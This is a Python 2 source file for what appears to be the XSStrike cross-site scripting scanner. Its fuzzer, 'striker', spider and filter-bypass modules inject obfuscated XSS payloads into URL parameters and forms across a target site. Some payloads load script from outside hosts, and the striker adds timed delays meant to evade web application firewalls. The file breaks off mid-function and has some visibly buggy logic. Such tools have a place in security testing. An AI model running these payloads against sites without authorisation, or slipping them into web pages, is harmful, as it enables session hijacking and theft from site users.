
#!/usr/bin/env python2
# -- coding: utf-8 --
#   Required Modules
from __future__ import with_statement
from __future__ import absolute_import
from Database.db import getFuzz
import copy
import random
import codecs
import string
from progressbar import *
from prettytable import PrettyTable
import webbrowser
import urllib
from urllib import *
import urllib2
from re import search
from urlparse import urlparse, parse_qs, parse_qsl
from HTMLParser import HTMLParser
import sys
import re
import httplib
import socket
import mechanize
from string import whitespace
import os
import time
import socket
from colorama import init , Style, Back,Fore
from io import open
from itertools import izip

###############################################################################
# Declaring some variables
###############################################################################
type = 'xss' #Used by Ninja to get fuzz for XSS from the database
WAF = "" #Used by WAF Detector
br = mechanize.Browser()
br.set_handle_robots(False) #Makes mechanize not to follow robots.txt file
xsschecker = "d3v" #A word that is unlikely to appear on a webpage,lets Fuzzer, Ninja, Hulk know where to attack
NUM_REFLECTIONS = 0 #Num of reflections found by fuzzer       

CURRENTLY_OPEN_TAGS = []
OPEN_TAGS = []                
OPEN_EMPTY_TAG = ""
blacklist = ['html','body','br'] #These tags are normally empty thats why we are ignoring them
whitelist = ['input', 'textarea'] #These tags are the top priority to break out from        

OCCURENCE_NUM = 0
OCCURENCE_PARSED = 0
LIST_OF_PAYLOADS = [] #A list of payloads that are marked as working by fuzzer

###################################################################
#   Payload Section
###################################################################
FUZZING_PAYLOADS_BASE = [ #Payloads which are used to check if it possible to break out of the tags where the input is getting reflected
    "<sCriPt>alert()</sCriPt>",
    "<script src=http://ha.ckers.org/xss.js></script>",
    "<script>alert(String.fromCharCode(88,83,83));</script>",
    "<IMG \"\"\"><script>alert(\"XSS\")</script>\">",
    "<img src=\"blah.jpg\" onerror=\"alert()\"/>"
]
#Don't touch these unless you know what are you doing
FUZZING_PAYLOADS_START_END_TAG = [
    "\"/><script>alert(1)</script>",
    "\"\/><img src=\"blah.jpg\" onerror=\"alert()\"/>",
    "\"\/><img src=\"blahjpg\" onerror=\"alert()\"/>"
]
#Don't touch these unless you know what are you doing
FUZZING_PAYLOADS_ATTR = [
    "\"><script>alert(1)</script>",
    "\"><img src=\"blah.jpg\" onerror=\"alert()\"/>",
    "'><script>alert(1)</script>"
]

#Payloads for the striker
vectors = [
"\"><imG/sRc=l oNerrOr=(prompt)() x>",
"<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
"<deTails oNToggle=confi\u0072m()>",
"<A/iD=x hREf=javascript&colon;(prompt)&lpar;1&rpar; id=x>Click</A>",
"/\"><img sRc=l oNerrOr=prompt() x>",
"\"'><iMg sRc=x:confirm`` oNError=e\u0076al(src)>",
"\"><sCript x>confirm``</script x>",
"'\"><sVg/oNLoad=prompt()>",
"\"><sCriPt sRc=//14.rs>",
"\"'><iMg sRc=x:confirm`` oNError=eval(src)>",
"'\"><svG oNLoad=confirm&#x28;1&#x29>",
"'\">/*-/*`/*\`/*'/*\"/**/(/* */<sVg/OnloAd=prompt() x>",
"\"'--!><Script x>prompt()</scRiPt x>",
"'\"--!><sVg/oNLoad=confirm()><\"",
"\"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>",
"\"><img src=x onerror=co\u006efir\u006d`1`>",
"\"><svg/onload=co\u006efir\u006d`1`>"
]
#######################################################################################################################
#  Fuzzer
#######################################################################################################################
def result(): #Prints result of fuzzing
    for payload in LIST_OF_PAYLOADS:
        print ("payload")
def fuzzer(): #Basic structure of fuzzer
    init_resp = make_request(URL) #Makes request to the URL which contains "d3v" i.e. xsschecker
    if(xsschecker in init_resp.lower()):
        global NUM_REFLECTIONS
        NUM_REFLECTIONS = init_resp.lower().count(xsschecker.lower()) #Counts number of time d3v got reflected in webpage
        print "\033[1;32m[+]\033[1;m Number of reflecttions found: " + str(NUM_REFLECTIONS)
        print "\033[1;97m[>]\033[1;m Scanning all the reflections"
        
    else: #Launched hulk if no reflection is found. Hulk Smash!
        print "\033[1;31m[-]\033[1;m No reflection found. \n\033[1;33m[!]\033[1;m Automatically launching Hulk!"
        hulk()
    
    for i in range(NUM_REFLECTIONS): #Starts checking all occurences one by one
        print "\033[1;97m[>]\033[1;m Testing reflection number: " + str(i + 1)
        global OCCURENCE_NUM
        OCCURENCE_NUM = i+1
        scan_occurence(init_resp)
        #Reset globals for next instance
        global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
        ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
        IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False
        OCCURENCE_PARSED = 0
        OPEN_EMPTY_TAG = ""
    if result == None: #If no payload is successful, it launches striker
        print "\033[1;31m[-]\033[1;m No suitable payload found with fuzzing."
        scan_a = raw_input("\033[1;34m[?]\033[1;m Do you want to use striker? [Y/n] ").lower()
        if scan_a == "n":
            print "\033[1;33m[!]\033[1;m Exiting..."
            quit()
        else:
            print "\033[1;31m--------------------------------------------\033[1;m"
            striker()
    else:
        print "\033[1;33m[!]\033[1;m Scan complete. List of suggested payloads:"
        result()
        scan_a = raw_input("\033[1;34m[?]\033[1;m Do you want to use striker? [Y/n] ").lower()
        if scan_a == "n":
            print "\033[1;33m[!]\033[1;m Exiting..."
            quit()
        else:
            print "\033[1;31m--------------------------------------------\033[1;m"
            striker()
#scan_occurence() runs scan for a reflected instance (a param can be used multiple times on a page)
def scan_occurence(init_resp):
    #Begin parsing HTML tags to locate the position of xsschecker i.e. d3v
    location = html_parse(init_resp)
    if(location == "comment"): #If its in a comment
        print "\033[1;33m[!]\033[1;m Reflection found in an HTML comment."
        break_comment() #It launches the function which knows how to break out of comment
    elif(location == "script_data"): #Checks if its in a script tag
        print "\033[1;33m[!]\033[1;m Reflection found as data in a script tag."
    elif(location == "html_data"): #Plaintext
        print "\033[1;33m[!]\033[1;m Reflection found as data or plaintext on the page."
        break_data()
    elif(location == "start_end_tag_attr"): #Attribute in an empty tag
        print "\033[1;33m[!]\033[1;m Reflection found as an attribute in an empty tag."
        break_start_end_attr()
    elif(location == "attr"): #Attribute in HTML tag
        print "\033[1;33m[!]\033[1;m Reflection found as an attribute in an HTML tag."
        break_attr()
#html_parse() locates the "d3v" and determins where it is in the HTML
def html_parse(init_resp):
    parser = MyHTMLParser()
    location = ""
    try:
        parser.feed(init_resp)
    except Exception as e:
        location = str(e)
    except:
        print "\033[1;31m[-]\033[1;m ERROR. Try rerunning?"
    return location

#test_param_check() simply checks to see if the provided string exists in the response occurence
#param_to_check is the parameter to insert in the request
#param_to_compare is the parameter to look for in the response
#Allows checking for characters that may be encoded differently. For example, check < but compare %3C
def test_param_check(param_to_check, param_to_compare):
    check_string = "XSSSTART" + param_to_check + "XSSEND"
    compare_string = "XSSSTART" + param_to_compare + "XSSEND"
    check_url = URL.replace(xsschecker, check_string)
    try:
        check_response = make_request(check_url)
    except:
        check_response = ""
    success = False
#Loop to get to right occurence
    occurence_counter = 0
    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
        occurence_counter += 1
        if((occurence_counter == OCCURENCE_NUM) and (check_response[m.start():m.start()+len(compare_string)].lower() == compare_string.lower())):
            success = True
            break
    return success

def make_request(in_url): #The main function which actually makes contact with the target
    try:
        resp = br.open(in_url) #Makes request
        return resp.read() #Reads the output
    except:
        print "\n\033[1;31m[-]\033[1;m URL is offline. \n\033[1;33m[!]\033[1;m Exiting..."
        quit()

def break_comment(): #Tests payloads which are proven to break out of HTML comments
    payload = "--><script>alert();</script>"
#Try the full payload first, if it doesn't work, start testing individual alternatives
    if(test_param_check(payload,payload)):
        payload = "--><script>alert();</script>"
        if(test_param_check(payload + "<!--",payload+"<!--")):
            payload = "--><script>alert();</script><!--"
    else:
        if(test_param_check("-->", "-->")):
            clean = test_param_check("<!--", "<!--")
            found = False
            for pl in FUZZING_PAYLOADS_BASE:
                pl = "-->" + pl
                if(clean):
                    pl = pl + "<!--"
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    LIST_OF_PAYLOADS.append(pl)
                    found = True
                    break
            if(not found):
                print "\033[1;31m[-]\033[1;m No successful fuzzing attacks. Check manually to confirm."
        else:
            payload = ""
            print "\033[1;31m[-]\033[1;m Cannot escape comment because the --> string needed to close the comment is escaped."
            
    if(payload): #Inserts the payload in working payloads list if it works
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload
    
def break_data(): #Tries to break out of plaintext :p
    payload = "<script>alert(1);</script>"
    if("textarea" in CURRENTLY_OPEN_TAGS):
        payload = "</textarea>" + payload
    if("title" in CURRENTLY_OPEN_TAGS):
        payload = "</title>" + payload
    if(test_param_check(payload,payload)):
        payload = payload
    else:
        found = False
        for pl in FUZZING_PAYLOADS_BASE:
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
        if(not found):
            payload = ""
            print "\033[1;31m[-]\033[1;m No successful fuzzing attacks. Check manually to confirm."

    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload

def break_start_end_attr(): #Tries to close tags
    payload = "\"/><script>alert();</script>"
    if(test_param_check(payload,payload)):
        payload = "\"/><script>alert();</script>"
# %20 is used in the function below to indicate a space, the return value would be a reflected space not %20 literally
        if(test_param_check(payload+"<br%20attr=\"", payload+"<br attr=\"")):
            payload = "\"/><script>alert();</script><br attr=\""
    else:
        # best case payload didn't work for some reason, find out why
        if(test_param_check("/>", "/>")):
#--> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean = test_param_check("<br%20attr=\"", "<br attr=\"")
            found = False
            for pl in FUZZING_PAYLOADS_START_END_TAG:
                if(clean):
                    pl = pl + "<br attr=\""
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m No successful fuzzing attacks. Check manually to confirm."
        else:
            # /> not allowed, trying a few alternatives. Resorting to invalid html.
            print "\033[1;31m[-]\033[1;m /> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"></" + OPEN_EMPTY_TAG + "><script>alert(1);</script>",
                "\"<div><script>alert(1);</script>"
                ]
            found = False
            for pl in payloads_invalid:
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;33m[!]\033[1;m Parameter was reflected in an attribute of an empty tag."
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload

def break_attr(): #Tries to break HTML attirbutes
    payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert();</script>"
    if(test_param_check(payload,payload)):
        if(test_param_check(payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\"")):
            payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert();</script><" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
    else: #Ideal payload didn't work, find out why
        if(test_param_check("\">", "\">")):
# "> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean_str = "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
            clean = test_param_check("<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", clean_str)
            found = False
            for pl in FUZZING_PAYLOADS_ATTR:
                if(clean):
                    pl = pl + clean_str
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m All fuzzing attacks failed. Check manually to confirm."
        else:
            print "\033[1;31m[-]\033[1;m \"> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"<div><script>alert(1);</script>",
                "\"</script><script>alert(1);</script>",
                "\"</><script>alert(1);</script>",
                "\"</><script>alert(1)</script>",
                "\"<><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
                ]
            found = False
            for pl in payloads_invalid:
                if(test_param_check(quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "\033[1;31m[-]\033[1;m Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    
    if(payload):
        if(payload not in LIST_OF_PAYLOADS): #avoid duplicates
            LIST_OF_PAYLOADS.append(payload)
        print "\033[1;32m[+]\033[1;m Suggested Payload: " + Style.BRIGHT + Fore.GREEN + payload
        
#HTML Parser class
class MyHTMLParser(HTMLParser):
    def handle_comment(self, data):
        global OCCURENCE_PARSED
        if(xsschecker.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                raise Exception("comment")
    
    def handle_startendtag(self, tag, attrs):
        global OCCURENCE_PARSED
        global OCCURENCE_NUM
        global OPEN_EMPTY_TAG
        if (xsschecker.lower() in str(attrs).lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")
            
    def handle_starttag(self, tag, attrs):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if(tag not in blacklist):
            CURRENTLY_OPEN_TAGS.append(tag)
        if (xsschecker.lower() in str(attrs).lower()):
            if(tag == "script"):
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("script")
            else:
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if(tag not in blacklist):
            CURRENTLY_OPEN_TAGS.remove(tag)
            
    def handle_data(self, data):
        global OCCURENCE_PARSED
        if (xsschecker.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
#    If last opened tag is a script, send back script_data
#    Try/catch is needed in case there are no currently open tags,
#    if not, it's considered data (may occur with invalid html when only param is on page)
                try:
                    if(CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS)-1] == "script"):
                        raise Exception("script_data")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")

############################################################################
#                        Striker (Forked from BruteXSS)
############################################################################z
def striker():
    def re():
        inp = raw_input("\033[1;34m[?]\033[1;m Send the target to Hulk? [Y/n]").lower()
        if inp == 'n':
            print "\033[1;33m[!]\033[1;m Exiting..."
            quit()
        else:
            hulk()
    def GET():
            try:
                try:
                    if WAF == "True": #If a WAF is detected
                        finalurl = urlparse(URL) #parses the url to break it into different parts like domain, params etc.
                        urldata = parse_qsl(finalurl.query)
                        domain0 = u'{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                        domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
                        paraname = [] #Parameter name
                        paravalue = [] #Parameter value
                        lop = unicode(len(vectors)) #Calculates the number of vectors i.d. WAF bypass payloads
                        print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
                        print "\033[1;97m[>]\033[1;m Striking the parameter(s)" 
                        parameters = parse_qs(finalurl.query,keep_blank_values=True) #Parses parameters
                        path = finalurl.scheme+"://"+finalurl.netloc+finalurl.path #Prepares the final URL by joining its multiple components
                        for para in parameters: #Arranging parameters and values.
                            for i in parameters[para]:
                                paraname.append(para)
                                paravalue.append(i)
                        total = 0
                        conclusion = 0 #Number of successful payloads
                        fpar = [] #Contains names of parameters
                        fresult = [] #List which contains the vulnerability status of a parameter
                        progress = 0 #Number of payloads that has been injected
                        for param_name, pv in izip(paraname,paravalue): #Scanning the parameter.
                            print "\033[1;97m[>]\033[1;m Testing parameter: "+ param_name
                            fpar.append(unicode(param_name)) #Appends parameter names to fpar list
                            for x in vectors: #Takes a payload from evade list
                                validate = x #declares the validate variable
                                if validate == "": #If the payload is absent it is skipped
                                    progress = progress + 1
                                else:
                                    time.sleep(6) #Delays the request by 6 seconds to bypass WAF
                                    progress = progress + 1 #1 payload has been injected
                                    sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(vectors)))
                                    sys.stdout.flush()
                                    enc = quote_plus(x) #URL encodes the payload
                                    data = path+"?"+param_name+"="+pv+enc #the whole url which contains the actual url and payload
                                    try:
                                        page = br.open(data) #Makes request to the payload injected url
                                        sourcecode = page.read() #Reads the response
                                    except: #In case something wrong happens :p
                                        print Style.BRIGHT + Fore.RED + "\n[-] There's some problem with the URL. Exiting..."
                                    try:
                                        if x in sourcecode: #if the payload is present in response
                                            print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(param_name,x)
                                            webbrowser.open(data) #Opens the injected URL in browser
                                            fresult.append("  Vulnerable  ") #Marks parameter as vulnerable
                                            conclusion = 1 #1 parameter is vulnerable
                                            total = total+1
                                            scan_j = raw_input("\033[1;34m[?]\033[1;m Keep the scan running? [y/N] ").lower()
                                            if scan_j == "y":
                                                pass
                                            else:
                                                print "\033[1;33m[!]\033[1;m Exiting..."
                                                quit()
                                        else:
                                            conclusion = 0 #No parameter is vulnerable to XSS
                                    except:
                                        print "\033[1;33m[!]\033[1;m Exiting..."
                                        quit()
                            if conclusion == 0:
                                print "\n\033[1;31m[-]\033[1;m '%s' parameter not vulnerable."%param_name
                                fresult.append("Not Vulnerable") #Marks parameter as non vulnerable
                                pass
                            progress = 0
                        complete(conclusion) #Prints the result
                    else:
                        finalurl = urlparse(URL)
                        urldata = parse_qsl(finalurl.query)
                        domain0 = u'{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                        domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
                        paraname = []
                        paravalue = []  
                        lop = unicode(len(vectors))
                        print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
                        print "\033[1;97m[>]\033[1;m Striking the parameter(s)" 
                        parameters = parse_qs(finalurl.query,keep_blank_values=True)
                        path = finalurl.scheme+"://"+finalurl.netloc+finalurl.path
                        for para in parameters: #Arranging parameters and values.
                            for i in parameters[para]:
                                paraname.append(para)
                                paravalue.append(i)
                        total = 0
                        conclusion = 0
                        fpar = []
                        fresult = []
                        progress = 0
                        for param_name, pv in izip(paraname,paravalue): #Scanning the parameter.
                            print "\033[1;97m[>]\033[1;m Testing parameter: "+ param_name
                            fpar.append(unicode(param_name))
                            for x in vectors: #
                                validate = x
                                if validate == "":
                                    progress = progress + 1
                                else:
                                    sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(vectors)))
                                    sys.stdout.flush()
                                    progress = progress + 1
                                    enc = quote_plus(x)
                                    data = path+"?"+param_name+"="+pv+enc
                                    try:
                                        page = br.open(data)
                                    except:
                                        print Style.BRIGHT + Fore.RED + "\n[-] Target responded with HTTP Error."
                                    sourcecode = page.read()
                                    if x in sourcecode:
                                        print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(param_name,x)
                                        webbrowser.open(data)
                                        fresult.append("  Vulnerable  ")
                                        conclusion = 1
                                        total = total+1
                                        scan_i = raw_input("\033[1;34m[?]\033[1;m Keep the scan running? [y/N] ").lower()
                                        if scan_i == "y":
                                            pass
                                        else:
                                            print "\033[1;33m[!]\033[1;m Exiting..."
                                            quit()
                                    else:
                                        conclusion = 0
                            if conclusion == 0:
                                print "\n\033[1;31m[-]\033[1;m '%s' parameter not vulnerable."%param_name
                                fresult.append("Not Vulnerable")
                                progress = progress + 1
                                pass
                            progress = 0
                    quit()
                except:
                    print "\033[1;31m[-]\033[1;m URL is offline!"
                    quit()
            except(KeyboardInterrupt), Exit:
                print "\n\033[1;33m[!]\033[1;m Exiting..."
    print GET()

def POST():
    try:
        try:
            param = param_data
            finalurl = urlparse(URL)
            urldata = parse_qsl(finalurl.query)
            domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
            domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
            path = urlparse(URL).scheme+"://"+urlparse(URL).netloc+urlparse(URL).path
            lop = str(len(vectors))
            print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
            print "\033[1;97m[>]\033[1;m Striking the parameter(s)" 
            params = "http://www.URL.com/?"+param
            finalurl = urlparse(params) #Parsing the params
            urldata = parse_qsl(finalurl.query) #Making parameter name & value list
            o = urlparse(params) #Defines the parsed params
            parameters = parse_qs(o.query,keep_blank_values=True)
            paraname = []
            paravalue = []
            for para in parameters: #Arranging parameters and values.
                for i in parameters[para]:
                    paraname.append(para)
                    paravalue.append(i)
            fpar = []
            fresult = []
            total = 0
            progress = 0
            pname1 = [] #Parameter
            payload1 = [] #payload
            for pn, pv in zip(paraname,paravalue): #Scanning the parameter.
                print "\033[1;97m[>]\033[1;m Testing parameter: "+pn
                fpar.append(str(pn))
                for i in vectors: #Takes payload from payload/vector list
                    validate = i
                    if validate == "":
                        progress = progress + 1
                    else:
                        progress = progress + 1
                        sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(vectors)))
                        sys.stdout.flush()
                        pname1.append(pn)
                        payload1.append(str(i))
                        d4rk = 0
                        for m in range(len(paraname)):
                            d = paraname[d4rk]
                            d1 = paravalue[d4rk]
                            tst= "".join(pname1)
                            tst1 = "".join(d)
                            if pn in d:
                                d4rk = d4rk + 1
                            else:
                                d4rk = d4rk +1
                                pname1.append(str(d))
                                payload1.append(str(d1))
                        data = urlencode(dict(zip(pname1,payload1)))
                        r = br.open(path, data)
                        sourcecode =  r.read()
                        pname1 = []
                        payload1 = []
                        if i in sourcecode:
                            print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(pn,i)
                            webbrowser.open(path, data)
                            fresult.append("  Vulnerable  ")
                            complete = 1
                            total = total+1
                            break
                        else:
                            complete = 0
                if complete == 0:
                    print "\n\033[1;31m[-]\033[1;m '%s' parameter not vulnerable." %pn
                    fresult.append("Not Vulnerable")
                    pass
                    progress = 0
            complete(conclusion)
        except:
            quit()
    except(KeyboardInterrupt) as Exit:
        print("\n\033[1;31m[-]\033[1;m Exiting...")

#############################################################
#                   Spider
############################################################
def initial_crawling(firstDomains):
    global URL
    parsed_URL = urlparse(URL) #Parsing the URL
    URL = u'{uri.scheme}://{uri.netloc}/'.format(uri=parsed_URL) #Fetching only the homepage from the supplied URL
    firstDomains = []   #list of links found during crawling
    print "\033[1;97m[>]\033[1;m Loading spider"  #doing a short traversal if no command line argument is being passed
    try:
        br.open(URL) #makes a request to the homepage
        print "\033[1;97m[>]\033[1;m Finding all the links present in the seed page " + str(URL)
        try:
            for link in br.links():     #finding the links in the homepage
                if URL in str(link.absolute_url): #if a link is found
                    firstDomains.append(str(link.absolute_url)) #it is added to total list list i.e. firstDomains
            firstDomains = list(set(firstDomains))
        except:
            pass
    except:
       pass
    print "\033[1;33m[!]\033[1;m Number of potenial targets: " + str(len(firstDomains))
    return firstDomains

def findxss(firstDomains):
    print "\033[1;97m[>]\033[1;m Loading fuzzing engine\n" #starting finding XSS
    xssLinks = []           #TOTAL CROSS SITE SCRIPTING FINDINGS
    count = 0           #to check for forms
    dummyVar = 0            #dummy variable for doing nothing
    if firstDomains > 0:    #if there is atleast one link
        for link in firstDomains:
            y = str(link)
            print str(link)
            if 'jpg' in y:  #checking if the URL is source of an image
                print "\033[1;33m[!]\033[1;m This is just an image."
            elif 'pdf' in y: #checking if the URL is source of an pdf document
                print "\033[1;33m[!]\033[1;m This is just a document."
            else: #If the URL is not a image or pdf document
                try:
                    br.open(str(link))  #open the link
                except: #If it fails due to some reason
                    dummyVar = 0
                try:
                    for form in br.forms(): #checking for forms in the URL
                        count = count + 1
                except:
                    dummyVar = 0
                if count > 0: #if a form exists, submit it
                    try:
                        params = list(br.forms())[0]    #our form
                    except:
                        dummyVar = 0
                    try:
                        br.select_form(nr=0)    #submit the first form
                    except:
                        dummyVar = 0
                    for p in params.controls:
                        par = str(p)
                        if 'TextControl' in par:        #submit only those forms which require text
                            try:
                                br.form[str(p.name)] = '<svg "ons>'     #our payload
                            except:
                                dummyVar = 0
                            try:
                                br.submit()
                            except:
                                dummyVar = 0
                            try:
                                if '<svg "ons>' in br.response().read():    #if payload is found in response, we have XSS
                                    print "\033[1;31m--------------------------------------------\033[1;m"
                                    print "\033[1;32m[+]\033[1;m Vulnerability found"
                                    print "\033[1;32m[+]\033[1;m Vulnerable Parameter: " + str(p.name)
                                    print "\033[1;32m[+]\033[1;m " + str(link)
                                    print "\033[1;32m[+]\033[1;m Payload type: <svg \"ons>"
                                    print "\033[1;31m--------------------------------------------\033[1;m"
                                    xssLinks.append(link)
                                else:
                                    dummyVar = 0
                            except:
                                print "\033[1;31m[-]\033[1;m Unable to read the page"
                            try:
                                br.back() #Going back to the original page so we can try second payload
                            except:
                                dummyVar = 0

                            #SECOND PAYLOAD

                            try:
                                br.form[str(p.name)] = 'javascript:alert(1)'    #second payload
                            except:
                                dummyVar = 0
                            try:
                                br.submit() #submiting the form
                            except:
                                dummyVar = 0
                            try:
                                if '<a href="javascript:alert(1)' in br.response().read(): #If the payload is found in response its vulnerable
                                    print "\nVulnerable page: " + str(link) + "\n [+] Payload Type: javascript:alert(1)" + "\n"
                                    xssLinks.append(link) #Adding link to the vulnerable links list
                                else:
                                    dummyVar = 0
                            except:
                                print "[\033[1;31m[-]\033[1;m Could not read the page"
                            try:
                                br.back()       #go back to the previous page
                            except:
                                dummyVar = 0
                    count = 0
        print "\033[1;33m[!]\033[1;m Scan completed."
        for link in xssLinks:       #print all xss findings
            print link
    else:
        print "\033[1;31m[-]\033[1;m There's some problem with the URL."
###################################################################
#               Ninja
###################################################################
url_based = [] #url based paylaods e.g. <x src=y.com/evil.js>
error_based = [] #error based payloads <img src=# onerror=alert()>
popup_based = [] #popup based payloads <audio onload=alert()>
f_url_based = [] #url based payloads which got filtered
f_error_based = [] #error based payloads which got filtered
f_popup_based = [] #error based payloads which got filtered
fuzzed = [] #Fuzz strings
popup = [] #Strings that raise popup e.g. alert()

def bypasser(type, fuzz, URL):
    pbar = ProgressBar(widgets=['\033[1;97m[>]\033[1;m Strings sent: ',SimpleProgress(), Bar()]) #Display progress
    result = [] #Result of fuzzing
    try:
        low_string = URL.replace("d3v", "'\"(<i=i>)\"'") #Inserting a string with all major chars
        low_request = br.open(low_string).read() #Making request to url
        low = low_request.find("'\"(<i=i>)\"'") #Checking if the string is present in response
        if low != -1: #If the string was not filtered
            print "\033[1;32m[+]\033[1;m Filter Strength : \033[1;32mLow\033[1;m"
            start_from = low - 3 #As at this position string was not filtered, we will use it as starting point for fuzzer
        else: #If string was filtered
            medium_string = URL.replace("d3v", "<xx+src%3Dxx+onxx%3Dxx>")
            medium_request = br.open(medium_string).read()
            medium = medium_request.find("<xx src=xx onxx=xx>")
            if medium != -1:
                print "\033[1;32m[+]\033[1;m Filter Strength : \033[1;33mMedium\033[1;m"
                start_from = medium - 3
            else: #Printing high since result was not medium/low
                print "\033[1;31m[-]\033[1;m Filter Strength : \033[1;31mHigh\033[1;m"
                start_from = 0
    except:
        pass
    for fuzz in pbar(fuzz):
        nature = fuzz[2] #Type of string e.g. event handler, error based payload etc.
        expected = fuzz[1] #ideal response of fuzzing
        fuzz = fuzz[0] #fuzz to be sent
        fuzz_enc = fuzz.encode('utf-8')
        try:
            if '=' in URL: # GET parameter
                randomString, url_with_fuzz = insertFuzz(URL, fuzz_enc) 
                response = br.open(url_with_fuzz)
            else: # POST parameter
                randomString, params_with_fuzz = setParams(param_data, fuzz_enc) 
                response = br.open(URL, urllib.urlencode(params_with_fuzz))
            content = response.read()
            occurence = content.find(randomString, start_from)+len(randomString) # get position of the randomString + length(randomString) to get to the fuzz
            result.append({
                'Type' : nature,
                'httpCode' : 'Success',
                'fuzz' : fuzz_enc,
                'expected' : expected, 
                'output' : content[occurence:occurence+len(expected)]}) # take string from occurence to occurence+len(expected)
        except(IOError): # HTTP Status != 200
            result.append({
                'Type' : nature,
                'httpCode' : '\033[1;31mBlocked\033[1;m',
                'fuzz' : fuzz_enc, 
                'expected' : expected, 
                'output' : '-'})
    showOutput(URL, result) 

def extractParams(input):
    """
        :Description: Splits params into individual parameters
        :input: POST Parameter
        :return: Dictionary with the parameter as elements
        :note: This function is required to prepare the parameter for the bypasser() function   
    """
    if input is None:
        return None
    input = input.split('&')
    param_data = {}
    for item in input:
